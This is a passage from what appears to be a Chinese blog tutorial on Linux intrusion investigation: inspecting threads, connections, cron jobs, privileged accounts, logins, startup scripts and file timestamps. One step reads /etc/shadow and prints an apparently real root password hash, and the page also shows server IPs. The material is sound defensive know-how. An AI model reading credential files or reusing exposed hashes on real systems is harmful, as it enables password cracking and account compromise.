href="#检查进程启动的所有线程" class="headerlink" title="检查进程启动的所有线程"></a>检查进程启动的所有线程</h4><h5 id="ps-H-T-p-pid"><a href="#ps-H-T-p-pid" class="headerlink" title="ps H -T -p pid"></a>ps H -T -p pid</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps H -T -p <span class="hljs-number">659535</span><br>    <span class="hljs-attribute">PID</span>    SPID TTY      STAT   TIME COMMAND<br> <span class="hljs-attribute">659535</span>  <span class="hljs-number">659535</span> ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/mysqld<br> <span class="hljs-attribute">659535</span>  <span class="hljs-number">659538</span> ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">17</span> /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><p>SPID：线程ID </p><p>COMMAND：线程名称</p><h5 id="ps-Lf-pid"><a href="#ps-Lf-pid" class="headerlink" title="ps -Lf pid"></a>ps -Lf pid</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -Lf <span class="hljs-number">659535</span><br><span class="hljs-attribute">UID</span>          PID    PPID     LWP  C NLWP STIME TTY      STAT   TIME CMD<br><span class="hljs-attribute">mysql</span>     <span class="hljs-number">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">659535</span>  <span class="hljs-number">0</span>   <span class="hljs-number">39</span> Mar07 ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/mysqld<br><span class="hljs-attribute">mysql</span>     <span class="hljs-number">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">659538</span>  <span class="hljs-number">0</span>   <span class="hljs-number">39</span> Mar07 ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">17</span> /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h3 id="排查异常网络连接"><a href="#排查异常网络连接" class="headerlink" title="排查异常网络连接"></a>排查异常网络连接</h3><h4 id="netstat-anlp-grep-ESTABLISHED"><a href="#netstat-anlp-grep-ESTABLISHED" class="headerlink" title="netstat -anlp | grep ESTABLISHED"></a>netstat -anlp | grep ESTABLISHED</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# netstat -anlp | grep ESTABLISHED<br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">172.16.24.136:51856</span>     <span class="hljs-number">100.100.30.28:80</span>        ESTABLISHED <span class="hljs-number">442626</span>/AliYunDun<br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>     <span class="hljs-number">80</span> <span class="hljs-number">172.16.24.136:22</span>        <span class="hljs-number">218.30.113.52:1642</span>      ESTABLISHED <span class="hljs-number">671506</span>/sshd: root@p<br></code></pre></td></tr></table></figure><h4 id="netstat-anlp-grep-LISTEN"><a href="#netstat-anlp-grep-LISTEN" class="headerlink" title="netstat -anlp | grep LISTEN"></a>netstat -anlp | grep LISTEN</h4><p>检查设备监听情况，排查是否存在高危端口、是否存在监听0.0.0.0</p><h3 id="排查异常定时任务"><a href="#排查异常定时任务" class="headerlink" title="排查异常定时任务"></a>排查异常定时任务</h3><h4 id="检查系统定时任务-etc-crontab"><a href="#检查系统定时任务-etc-crontab" class="headerlink" title="检查系统定时任务&#x2F;etc&#x2F;crontab"></a>检查系统定时任务&#x2F;etc&#x2F;crontab</h4><h5 id="cat-etc-crontab"><a href="#cat-etc-crontab" class="headerlink" title="cat &#x2F;etc&#x2F;crontab"></a>cat &#x2F;etc&#x2F;crontab</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nix">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># cat /etc/crontab</span><br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br><span class="hljs-attr">SHELL</span><span class="hljs-operator">=</span><span class="hljs-symbol">/bin/sh</span><br><span class="hljs-comment"># You can also override PATH, but by default, newer versions inherit it from the environment</span><br><span class="hljs-comment">#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br><span class="hljs-number">17</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span>root    cd <span class="hljs-symbol">/</span> <span class="hljs-operator">&amp;&amp;</span> run-parts <span class="hljs-operator">-</span>-report <span class="hljs-symbol">/etc/cron.hourly</span><br><span class="hljs-number">25</span> <span class="hljs-number">6</span><span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span>roottest <span class="hljs-operator">-</span>x <span class="hljs-symbol">/usr/sbin/anacron</span> <span class="hljs-operator">||</span> ( cd <span class="hljs-symbol">/</span> <span class="hljs-operator">&amp;&amp;</span> run-parts <span class="hljs-operator">-</span>-report <span class="hljs-symbol">/etc/cron.daily</span> )<br><span class="hljs-number">47</span> <span class="hljs-number">6</span><span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-number">7</span>roottest <span class="hljs-operator">-</span>x <span class="hljs-symbol">/usr/sbin/anacron</span> <span class="hljs-operator">||</span> ( cd <span class="hljs-symbol">/</span> <span class="hljs-operator">&amp;&amp;</span> run-parts <span class="hljs-operator">-</span>-report <span class="hljs-symbol">/etc/cron.weekly</span> )<br><span class="hljs-number">52</span> <span class="hljs-number">6</span><span class="hljs-number">1</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span>roottest <span class="hljs-operator">-</span>x <span class="hljs-symbol">/usr/sbin/anacron</span> <span class="hljs-operator">||</span> ( cd <span class="hljs-symbol">/</span> <span class="hljs-operator">&amp;&amp;</span> run-parts <span class="hljs-operator">-</span>-report <span class="hljs-symbol">/etc/cron.monthly</span> )<br></code></pre></td></tr></table></figure><h4 id="检查各用户定时任务-var-spool-cron"><a href="#检查各用户定时任务-var-spool-cron" class="headerlink" title="检查各用户定时任务 &#x2F;var&#x2F;spool&#x2F;cron"></a>检查各用户定时任务 &#x2F;var&#x2F;spool&#x2F;cron</h4><h5 id="cat-var-spool-cron-username"><a href="#cat-var-spool-cron-username" class="headerlink" title="cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;username"></a>cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;username</h5><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-xx_xx_xx_xx cron]<span class="hljs-comment"># ls -lat /var/spool/cron/</span><br>总用量 12<br>drwx------. <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>3月 <span class="hljs-number"> 12 </span>17:20 .<br>-rw-------  <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 19 </span>3月 <span class="hljs-number"> 12 </span>17:20 root<br>drwxr-xr-x.<span class="hljs-number"> 11 </span>root root<span class="hljs-number"> 4096 </span>8月 <span class="hljs-number"> 18 </span>2023 ..<br><br><br>(base) [root@aliyun-xx_xx_xx_xx cron]<span class="hljs-comment"># cat /var/spool/cron/root</span><br>* * * * * echo 111<br>您在 /var/spool/mail/root 中有新邮件<br></code></pre></td></tr></table></figure><h5 id="检查当前用户定时任务-crontab-l"><a href="#检查当前用户定时任务-crontab-l" class="headerlink" title="检查当前用户定时任务 crontab -l"></a>检查当前用户定时任务 crontab -l</h5><p>读取&#x2F;var&#x2F;spool&#x2F;cron目录下对应用户的记录</p><h5 id="检查对于用户的定时任务-crontab-u-name-l"><a href="#检查对于用户的定时任务-crontab-u-name-l" class="headerlink" title="检查对于用户的定时任务 crontab -u name -l"></a>检查对于用户的定时任务 crontab -u name -l</h5><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@aliyun</span>-x cron]<span class="hljs-meta"># crontab -u root -l</span><br>* * * * * echo <span class="hljs-number">111</span><br></code></pre></td></tr></table></figure><h4 id="需要关注的定时任务目录及文件"><a href="#需要关注的定时任务目录及文件" class="headerlink" title="需要关注的定时任务目录及文件"></a>需要关注的定时任务目录及文件</h4><h5 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>crontab<br><span class="hljs-regexp">/etc/</span>cron.hourly<br><span class="hljs-regexp">/etc/</span>cron.daily<br><span class="hljs-regexp">/etc/</span>cron.weekly<br><span class="hljs-regexp">/etc/</span>cron.monthly<br><span class="hljs-regexp">/etc/</span>anacrontab<br></code></pre></td></tr></table></figure><h5 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>cron.d/*<br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>*<br></code></pre></td></tr></table></figure><h3 id="排查异常用户"><a href="#排查异常用户" class="headerlink" title="排查异常用户"></a>排查异常用户</h3><h4 id="检查特权账号"><a href="#检查特权账号" class="headerlink" title="检查特权账号"></a>检查特权账号</h4><h5 id="awk-F-‘-3-0-print-1-’-etc-passwd"><a href="#awk-F-‘-3-0-print-1-’-etc-passwd" class="headerlink" title="awk -F: ‘$3&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;passwd"></a>awk -F: ‘$3&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;passwd</h5><p>默认情况下，只有root用户是特权用户</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">root<span class="hljs-meta">@iZbp</span>1191gh7vw52537lyxrZ:/# awk -F: <span class="hljs-string">&#x27;<span class="hljs-subst">$3</span>==0 &#123;print <span class="hljs-subst">$1</span>&#125;&#x27;</span> /etc/passwd<br>root<br></code></pre></td></tr></table></figure><p>读取&#x2F;etc&#x2F;passwd文件 以 : 分割字符，当第三个字符为0时，输出第一个字符</p><h4 id="检查可登录账号"><a href="#检查可登录账号" class="headerlink" title="检查可登录账号"></a>检查可登录账号</h4><p>查看存在密码账户，也就是可能会登录的账户</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">awk <span class="hljs-string">&#x27;/\<span class="hljs-variable">$1</span>|\<span class="hljs-variable">$5</span>|\<span class="hljs-variable">$6</span>/ &#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> /etc/shadow<br></code></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift">root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span>:<span class="hljs-regexp">/# awk &#x27;/</span>\<span class="hljs-variable">$1</span><span class="hljs-operator">|</span>\<span class="hljs-variable">$5</span><span class="hljs-operator">|</span>\<span class="hljs-variable">$6</span><span class="hljs-operator">/</span> &#123;print <span class="hljs-variable">$1</span>&#125;&#x27; <span class="hljs-regexp">/etc/</span>shadow<br>root:<span class="hljs-variable">$6</span><span class="hljs-variable">$OFsjgtZl</span><span class="hljs-variable">$ng76xjs7xQZH0asW6h1RGwXSSD6nD5sIJF163Etabm8ydItXJiD0T8KRBPwmcUdG</span><span class="hljs-operator">/</span><span class="hljs-type">WDlckAtnlQOmaYVnDPis</span>.:<span class="hljs-number">19548</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><br></code></pre></td></tr></table></figure><p>读取 &#x2F;etc&#x2F;shadow 文件，匹配包含 $1 $5 $6 任意一个的字符串</p><h3 id="排查异常登录"><a href="#排查异常登录" class="headerlink" title="排查异常登录"></a>排查异常登录</h3><p>检查&#x2F;var&#x2F;run&#x2F;utmp，&#x2F;var&#x2F;log&#x2F;wtmp 中的记录</p><h4 id="who"><a href="#who" class="headerlink" title="who"></a>who</h4><p>查看当前登录用户信息用户名、登录方式（tty：本地登录、pst：远程登录）、登录时间、登录IP</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# who<br>root     tty1         2022<span class="hljs-string">-06</span><span class="hljs-string">-26</span> 09:35<br>root     pts/0        2022<span class="hljs-string">-08</span><span class="hljs-string">-24</span> 22:39 (125.33.205.114)<br></code></pre></td></tr></table></figure><p>默认数据来源</p><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;var&#x2F;log&#x2F;wtmp 二进制文件 权限 -rw-rw-r–  root utmp</p><h4 id="w"><a href="#w" class="headerlink" title="w"></a>w</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w</span><br> <span class="hljs-number">22</span>:<span class="hljs-number">53</span>:<span class="hljs-number">35</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">13</span>:<span class="hljs-number">20</span>,  <span class="hljs-number">2</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>root     tty1                      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">35</span>   <span class="hljs-number">0.10s</span>  <span class="hljs-number">0.10s</span> -bash<br>root     pts/<span class="hljs-number">0</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>   <span class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">7.00s</span>  <span class="hljs-number">0.02s</span>  <span class="hljs-number">0.00s</span> w<br></code></pre></td></tr></table></figure><p>默认数据来源</p><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;proc</p><h4 id="last"><a href="#last" class="headerlink" title="last"></a>last</h4><p>输出历史登录成功用户</p><h4 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h4><p>输出历史登录用户，包含登录成功和失败</p><h3 id="排查异常开机启动"><a href="#排查异常开机启动" class="headerlink" title="排查异常开机启动"></a>排查异常开机启动</h3><h4 id="开机启动目录-etc-init-d"><a href="#开机启动目录-etc-init-d" class="headerlink" title="开机启动目录&#x2F;etc&#x2F;init.d&#x2F;"></a>开机启动目录&#x2F;etc&#x2F;init.d&#x2F;</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># ls -lat /etc/init.d/</span><br>total 184<br>drwxr-xr-x<span class="hljs-number"> 116 </span>root root<span class="hljs-number"> 4096 </span>Mar <span class="hljs-number"> 2 </span>06:03 ..<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 5 </span>17:08 .<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 5607 </span>Jun<span class="hljs-number"> 15 </span><span class="hljs-number"> 2023 </span>mysql<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4579 </span>May<span class="hljs-number"> 31 </span><span class="hljs-number"> 2023 </span>nginx<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 985 </span>Dec <span class="hljs-number"> 2 </span><span class="hljs-number"> 2022 </span>grub-common<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2915 </span>May<span class="hljs-number"> 10 </span><span class="hljs-number"> 2022 </span>apport<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 6871 </span>Mar <span class="hljs-number"> 8 </span><span class="hljs-number"> 2022 </span>udev<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4060 </span>Feb<span class="hljs-number"> 26 </span><span class="hljs-number"> 2022 </span>ssh<br></code></pre></td></tr></table></figure><h3 id="排查异常文件"><a href="#排查异常文件" class="headerlink" title="排查异常文件"></a>排查异常文件</h3><p>检查文件内容使用 cat 命令，不会修改文件时间属性，如果使用vim，可能会修改文件时间属性</p><h4 id="文件时间检查"><a href="#文件时间检查" class="headerlink" title="文件时间检查"></a>文件时间检查</h4><p><strong>stat filename 查看文件时间，change&#x2F;最近改动是文件落盘时间</strong></p><p>示例：</p><p>原始文件时间信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0644</span>/-rw-r--r--)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">30</span>.<span class="hljs-number">511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br> <br></code></pre></td></tr></table></figure><p>vim文件wq退出，修改文件modify和change时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# vim <span class="hljs-number">11</span>.txt<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0644</span>/-rw-r--r--)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">30</span>.<span class="hljs-number">511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">790640177</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>chmod改变文件属性，会修改Change时间</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># ls -lat 11.txt</span><br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">2</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span> <span class="hljs-number">11</span>.txt<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># chmod o+x 11.txt</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># ls -lat 11.txt</span><br>-rw-r--r-x <span class="hljs-number">1</span> root root <span class="hljs-number">2</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span> <span class="hljs-number">11</span>.txt<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># stat 11.txt</span><br>  <span class="hljs-symbol">File:</span> <span class="hljs-number">11</span>.txt<br>  <span class="hljs-symbol">Size:</span> <span class="hljs-number">2</span>         <span class="hljs-symbol">Blocks:</span> <span class="hljs-number">8</span>          <span class="hljs-title class_">IO</span> <span class="hljs-symbol">Block:</span> <span class="hljs-number">4096</span>   regular file<br><span class="hljs-symbol">Device:</span> fc03h/<span class="hljs-number">64515</span>d<span class="hljs-symbol">Inode:</span> <span class="hljs-number">654221</span>      <span class="hljs-symbol">Links:</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">Access:</span> (<span class="hljs-number">0645</span>/-rw-r--r-x)  <span class="hljs-symbol">Uid:</span> (    <span class="hljs-number">0</span>/    root)   <span class="hljs-symbol">Gid:</span> (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-symbol">Access:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">09</span><span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">30.511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-symbol">Modify:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span><span class="hljs-symbol">:</span><span class="hljs-number">33.786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-symbol">Change:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">49.314207667</span> +<span class="hljs-number">0800</span><br> <span class="hljs-symbol">Birth:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">09</span><span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">26.983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>web访问，会修改access时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0645</span>/-rw-r--r-x)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">46</span>:<span class="hljs-number">17</span>.<span class="hljs-number">408516145</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49</span>.<span class="hljs-number">314207667</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span 